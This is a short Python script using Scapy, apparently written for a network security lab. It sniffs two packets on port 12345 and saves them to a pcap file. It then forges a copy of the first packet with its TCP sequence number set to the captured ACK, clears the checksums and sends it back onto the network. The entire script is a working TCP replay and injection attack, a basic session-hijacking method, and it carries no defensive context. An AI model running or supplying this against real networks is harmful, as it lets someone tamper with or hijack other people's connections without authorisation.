from scapy.all import *
from scapy.layers.inet import IP, TCP

if __name__ == "__main__":
    # get the send and ack packet
    pkts = sniff(filter="port 12345", count=2)

    # store in replay.pcap
    wrpcap('replay.pcap', pkts)

    # set the TCP sequence number to be the last packet's ACK
    attpkt = pkts[0]
    attpkt[TCP].seq = pkts[1][TCP].ack

    # To force recalculate the checksum
    del(attpkt.getlayer(IP).chksum)
    del(attpkt.getlayer(TCP).chksum)
    
    send(attpkt)
    